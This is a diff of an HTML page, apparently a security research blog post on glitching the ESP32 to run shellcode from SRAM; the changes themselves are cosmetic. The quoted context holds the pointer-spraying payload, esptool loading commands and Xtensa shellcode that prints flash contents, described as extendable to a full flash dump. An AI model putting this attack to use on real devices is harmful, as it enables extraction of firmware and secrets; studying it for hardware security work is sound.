@@ -69,7 +69,7 @@
 	<!-- RSS feed discovery -->
 	
 
-	<meta name="generator" content="Hugo 0.164.0">
+	<meta name="generator" content="Hugo 0.145.0">
 
 	<!-- plugins -->
 	
@@ -242,11 +242,11 @@
 <p>During the identification of the original attack, we jumped to an invalid address, which resulted in an exception. We decided to take a similar approach by trying to load <code>0x41414141</code> into the PC register of the CPU. This is, indeed, an invalid address and should result in an easily identifiable exception.</p>
 <h4 id="payload">Payload</h4>
 <p>Below, we show the source code for the SRAM payload we used for identifying the vulnerability. It implements a command handler with a single command, which is used to trigger a <code>Watchdog</code> reset.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">#define a &#34;.word 0x41414141;&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">#define a &#34;.word 0x41414141;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define t a a a a a a a a a a
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define h t t t t t t t t t t
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define d h h h h h h h h h h
-</span></span></span><span style="display:flex;"><span>
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">__attribute__</span>((noreturn)) <span style="color:#50fa7b">call_start_cpu0</span>() {
 </span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/* attach the UART  */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">uartAttach</span>();
@@ -268,16 +268,16 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span>(<span style="color:#bd93f9">1</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The pointers, in total 1000, are set to <code>0x41414141</code>. When this value gets loaded into the PC register of the CPU due to the effect of a glitch, an exception is printed on the serial interface, allowing us to identify that a successful glitch has occurred.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> Fatal exception <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>: IllegalInstruction
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> Fatal exception <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>: IllegalInstruction
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">epc1</span><span style="color:#ff79c6">=</span>0x41414141,
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">epc2</span><span style="color:#ff79c6">=</span>0x00000000,
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">epc3</span><span style="color:#ff79c6">=</span>0x00000000,
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">excvaddr</span><span style="color:#ff79c6">=</span>0x00000000,
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">depc</span><span style="color:#ff79c6">=</span>0x00000000
 </span></span></code></pre></div><p>The payload is build using Espressif&rsquo;s ESP-IDF framework as is shown below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ idf.py bootloader
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ idf.py bootloader
 </span></span></code></pre></div><p>The resulting binary looks is shown below. As visible in the hexdump, the pointers injected into the binary start at offset <code>0x13c</code> and are, as expected, 4-bytes aligned.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hexdump -C build/bootloader/bootloader.bin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hexdump -C build/bootloader/bootloader.bin
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>  e9 <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">02</span> <span style="color:#bd93f9">10</span> 1c <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">08</span> <span style="color:#bd93f9">40</span>  ee <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>  |.......@........|
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000010</span>  <span style="color:#bd93f9">00</span> 8f <span style="color:#bd93f9">01</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">01</span>  <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> ff 3f <span style="color:#bd93f9">54</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>  |...........?T...|
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000020</span>  <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">73</span> <span style="color:#bd93f9">73</span> <span style="color:#bd93f9">65</span> <span style="color:#bd93f9">72</span> <span style="color:#bd93f9">74</span> <span style="color:#bd93f9">20</span> <span style="color:#bd93f9">66</span>  <span style="color:#bd93f9">61</span> <span style="color:#bd93f9">69</span> 6c <span style="color:#bd93f9">65</span> <span style="color:#bd93f9">64</span> <span style="color:#bd93f9">20</span> <span style="color:#bd93f9">69</span> 6e  |Assert failed in|
@@ -306,9 +306,9 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">00001100  3a 68 92 e5 8e 53 dc b0  8c fa 77 c9 34 5e 1e 3d  |:h...S....w.4^.=|
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">00001110  ff 52 48 c7 22 c2 ea c6  48 b2 59 fe 06 8a 1c 6d  |.RH.&#34;</span>...H.Y....m|
 </span></span></code></pre></div><p>Then, we use Espressif&rsquo;s <code>esptool.py</code> to load the payload into SRAM using the ESP32&rsquo;s Download Mode.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ esptool.py --no-stub load_ram build/bootloader/bootloader.bin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ esptool.py --no-stub load_ram build/bootloader/bootloader.bin
 </span></span></code></pre></div><p>Even though we could run the <code>esptool.py</code> from a shell, we decided to do it directly from Python, which is not actually very difficult as the tool is made in Python as well. Hence, we can import is as a module as is shown below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> esptool
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> esptool
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#6272a4"># send bootloader to ram</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;build/bootloader/bootloader.bin&#34;</span>
@@ -321,7 +321,7 @@
 </span></span></code></pre></div><p>Now it&rsquo;s time to figure out when to inject a glitch and have one of the pointers stored in SRAM, loaded into the PC register of the CPU.</p>
 <h4 id="timing">Timing</h4>
 <p>As the payload that we load into SRAM is based on the original ESP32 bootloader, it actually consists of similar sections. As a result, the text section (i.e., instructions) of the SRAM payload is loaded to the same address as the original bootloader (i.e., <code>0x40080400</code>). This is visible by running <code>extensa-esp32-elf-readelf</code> onto the RAM payload as is shown below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ extensa-esp32-elf-readelf -l build/bootloader/bootloader.elf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ extensa-esp32-elf-readelf -l build/bootloader/bootloader.elf
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Elf file <span style="color:#8be9fd;font-style:italic">type</span> is EXEC <span style="color:#ff79c6">(</span>Executable file<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>Entry point 0x4008041c
@@ -383,26 +383,26 @@
 <li><code>&quot;\x25\x78\x0a\x00&quot;</code>: &ldquo;%x\n&rdquo;</li>
 </ul>
 <p>The above data is used by the shellcode stored at address <code>0x40080000</code> in SRAM. This payload only prints 4 bytes from flash, but it can easily be extended to dump the entire flash via the serial interface (i.e., a nice exercise for our students at our <a href="https://raelize.com/taofi/">TAoFI</a> training).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>.text
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>.text
 </span></span><span style="display:flex;"><span>.global _start
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">_start</span>:
 </span></span><span style="display:flex;"><span>    movi    a2, <span style="color:#bd93f9">0x50</span>
 </span></span><span style="display:flex;"><span>    slli    a2, a2, <span style="color:#bd93f9">24</span>      <span style="color:#6272a4">// a2 = 0x50000000
-</span></span></span><span style="display:flex;"><span>    l32i.n  a8, a2, <span style="color:#bd93f9">0</span>       <span style="color:#6272a4">// a8 = &amp;ets_printf
-</span></span></span><span style="display:flex;"><span>    l32i.n  a10, a2, <span style="color:#bd93f9">4</span>      <span style="color:#6272a4">// a10 = &amp;&#34;%x\n&#34;
-</span></span></span><span style="display:flex;"><span>    l32i    a11, a2, <span style="color:#bd93f9">8</span>      <span style="color:#6272a4">// a11 = &amp;flash
-</span></span></span><span style="display:flex;"><span>    l32i    a11, a11, <span style="color:#bd93f9">0</span>     <span style="color:#6272a4">// a11 = flash (4 bytes of the flash header)
-</span></span></span><span style="display:flex;"><span>    callx8  a8              <span style="color:#6272a4">// call ets_printf to print 4 bytes of flash header
-</span></span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">self</span>:
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    l32i.n  a8, a2, <span style="color:#bd93f9">0</span>       <span style="color:#6272a4">// a8 = &amp;ets_printf
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    l32i.n  a10, a2, <span style="color:#bd93f9">4</span>      <span style="color:#6272a4">// a10 = &amp;&#34;%x\n&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    l32i    a11, a2, <span style="color:#bd93f9">8</span>      <span style="color:#6272a4">// a11 = &amp;flash
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    l32i    a11, a11, <span style="color:#bd93f9">0</span>     <span style="color:#6272a4">// a11 = flash (4 bytes of the flash header)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    callx8  a8              <span style="color:#6272a4">// call ets_printf to print 4 bytes of flash header
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">self</span>:
 </span></span><span style="display:flex;"><span>    j self
 </span></span></code></pre></div><p>We can assemble the above shellcode using <code>xtensa-esp32-elf-as</code>, which is provided as part of Espressif&rsquo;s ESP-IDF.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xtensa-esp32-elf-as g_shellcode_text.s -o g_shellcode_text.o
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xtensa-esp32-elf-as g_shellcode_text.s -o g_shellcode_text.o
 </span></span><span style="display:flex;"><span>xtensa-esp32-elf-objdump -d g_shellcode_text.o --adjust-vma<span style="color:#ff79c6">=</span>0x40080000
 </span></span><span style="display:flex;"><span>xtensa-esp32-elf-objcopy -O binary -j .text g_shellcode_text.o g_shellcode_text
 </span></span><span style="display:flex;"><span>xxd -i g_shellcode_text
 </span></span></code></pre></div><p>We use a bit of additional magic to output c-style code that we can copy-pasta (!!!) directly in the source code of our SRAM payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>Disassembly of section .<span style="color:#8be9fd;font-style:italic">text</span>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>Disassembly of section .<span style="color:#8be9fd;font-style:italic">text</span>:
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">40080000</span> <span style="color:#ff79c6">&lt;</span>_start<span style="color:#ff79c6">&gt;:</span>
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">40080000</span><span style="color:#ff79c6">:</span>   <span style="color:#bd93f9">025</span>c        movi.n  a2, <span style="color:#bd93f9">80</span>
@@ -423,21 +423,21 @@
 </span></span></code></pre></div><p>We can use this output directly in our RAM payload source code as is shown in the next section.</p>
 <h4 id="payload-1">Payload</h4>
 <p>We modified the SRAM payload we used during the identification in order to copy the shellcode and its data section to the correct locations in SRAM. Note, also the pointer, denoted by <code>a</code>, now changed from <code>0x41414141</code> to <code>0x40080000</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#6272a4">/* pointer pointing to a our shellcode in SRAM */</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#6272a4">/* pointer pointing to a our shellcode in SRAM */</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define a &#34;.word 0x40080000;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define t a a a a a a a a a a
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define h t t t t t t t t t t
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define d h h h h h h h h h h
-</span></span></span><span style="display:flex;"><span>
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
 </span></span><span style="display:flex;"><span><span style="color:#6272a4">// shellcode data
-</span></span></span><span style="display:flex;"><span><span style="color:#8be9fd">uint32_t</span> g_shellcode_data[] <span style="color:#ff79c6">=</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">uint32_t</span> g_shellcode_data[] <span style="color:#ff79c6">=</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x54\x7d\x00\x40</span><span style="color:#f1fa8c">&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x0c\x00\x00\x50</span><span style="color:#f1fa8c">&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00\x10\x40\x3f</span><span style="color:#f1fa8c">&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x25\x78\x0a\x00</span><span style="color:#f1fa8c">&#34;</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#6272a4">// shellcode text
-</span></span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> g_shellcode_text[] <span style="color:#ff79c6">=</span> {
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> g_shellcode_text[] <span style="color:#ff79c6">=</span> {
 </span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x5c</span>, <span style="color:#bd93f9">0x02</span>, <span style="color:#bd93f9">0x80</span>, <span style="color:#bd93f9">0x22</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0x02</span>, <span style="color:#bd93f9">0xa8</span>, <span style="color:#bd93f9">0x12</span>, <span style="color:#bd93f9">0xb8</span>, <span style="color:#bd93f9">0x22</span>, <span style="color:#bd93f9">0xb8</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0x0b</span>, <span style="color:#bd93f9">0xe0</span>, <span style="color:#bd93f9">0x08</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x06</span>, <span style="color:#bd93f9">0xff</span>, <span style="color:#bd93f9">0xff</span>
 </span></span><span style="display:flex;"><span>};
@@ -570,7 +570,7 @@
 
 <!-- Main Script -->
 
-<script src="https://raelize.com/js/script.min.30c5d71cc6d4427af95614c557ab5b3e327ad2aa865d9c4cb3e3af601bd051948abde36c96cad1b4cb71909318d0e18c.js" integrity="sha384-MMXXHMbUQnr5VhTFV6tbPjJ60qqGXZxMs&#43;OvYBvQUZSKveNslsrRtMtxkJMY0OGM"></script>
+<script src="https://raelize.com/js/script.min.117f25fdd69809937e03f47113cbf673f49c2074d65da15ea1d385ad742d92a49ed5dd2000a4585ecfdebda6feb7ef54.js" integrity="sha384-EX8l/daYCZN&#43;A/RxE8v2c/ScIHTWXaFeodOFrXQtkqSe1d0gAKRYXs/evab&#43;t&#43;9U"></script>
 
 
 </body>
